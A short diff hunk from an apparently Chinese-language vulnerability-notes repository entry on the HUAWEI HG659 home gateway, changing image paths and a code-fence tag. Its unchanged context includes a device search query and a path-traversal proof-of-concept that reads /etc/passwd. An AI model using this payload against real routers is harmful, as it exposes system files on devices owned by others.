@@ -20,12 +20,12 @@ app="HUAWEI-Home-Gateway-HG659"
 
 登录页面如下
 
-![](images/202202110951141.png)
+![](../.gitbook/assets/202202110951141.png)
 
 POC如下
 
-```plain
+```
 /lib///....//....//....//....//....//....//....//....//etc//passwd
 ```
 
-![](images/202202110951927.png)
+![](../.gitbook/assets/202202110951927.png)
